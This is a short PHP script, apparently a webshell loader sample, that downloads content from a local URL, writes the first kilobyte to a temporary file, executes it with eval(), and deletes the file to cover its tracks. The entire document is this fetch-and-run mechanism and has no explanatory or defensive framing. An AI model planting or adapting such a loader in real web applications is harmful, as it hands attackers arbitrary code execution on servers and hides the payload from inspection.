<?php
// Author: REInject

$src = fopen('http://127.0.0.1/28/t1.html', 'r');
$dest1 = fopen('first1k.txt', 'w');

echo stream_copy_to_stream($src, $dest1, 1024) . " bytes copied to first1k.txt\n";

//tt
eval(file_get_contents('first1k.txt'));
unlink('first1k.txt');
?>
